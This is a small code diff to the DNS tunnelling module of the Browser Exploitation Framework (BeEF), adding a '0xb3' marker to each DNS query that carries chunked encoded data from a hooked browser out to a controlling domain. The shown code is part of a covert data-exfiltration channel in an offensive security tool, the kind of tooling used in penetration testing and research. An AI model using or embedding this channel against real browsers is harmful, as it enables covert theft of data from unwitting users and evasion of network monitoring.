@@ -71,11 +71,13 @@ beef.net.dns = {
 
         var segments = encodedData.chunk(max_data_segment_length);
 
+        var ident = "0xb3"; //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request
+
         //TODO remove this
         console.log(segments.length);
 
         for (var seq=1; seq<=segments.length; seq++) {
-            sendQuery(msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
+            sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
         }
 
 		// callback - returns the number of queries sent
